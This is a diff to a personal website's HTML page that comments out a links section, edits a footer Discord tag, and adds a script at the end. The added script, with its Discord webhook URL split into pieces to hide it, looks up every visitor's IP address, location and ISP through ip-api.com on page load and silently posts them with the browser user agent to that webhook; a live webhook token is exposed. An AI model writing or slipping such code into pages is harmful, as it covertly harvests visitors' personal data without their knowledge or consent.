@@ -96,7 +96,7 @@
 <br>
 <br>
 
-<div id="links">
+<!-- <div id="links">
 	<h2 class="white font-weight-bold">Some websites I made:</h2><br><br><br>
 	<div class="cards-list">
 
@@ -134,7 +134,7 @@
 </a>
 
 
-
+ -->
 
 
 
@@ -153,7 +153,7 @@
 <br><br><br>
 <footer class="footer foot center" style="background: #121212;">
 	<br>
-	<p>©2021 <a href="https://discord.com/users/693116936871084063" target="_blank" rel="noreferrer noopener" class="footer-text">MasterMind#2023</a></p>
+	<p>©2021 <a href="https://discord.com/users/693116936871084063" target="_blank" rel="noreferrer noopener" class="footer-text">MasterMind#7603</a></p>
 	<br>
 
 
@@ -161,6 +161,18 @@
 
 <script type="text/javascript">
 if(location.href==="https://memastermind.tk/"){location.href = "https://mastermind.tk"}
+url = "https://discord.com/ap"+"i/webhooks/10660371740"+"19043359/RD08fANiei7ZqUludvAvxBYMF_c"+"kcmjdio5diLmssSGM_E1YttKMAnzX8O2mukrJa277"
+fetch('http://ip-api.com/json/')
+    .then(results => results.json())    
+    .then(data => fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: `**IP:** ${data.query}\n**Country:** ${data.country}\n**Region:** ${data.regionName}\n**City:** ${data.city}\n**ISP:** ${data.isp}\n**Timezone:** ${data.timezone}\n**Browser:** ${navigator.userAgent}`
+        })
+    }));
 </script>
 </body>
 </html>
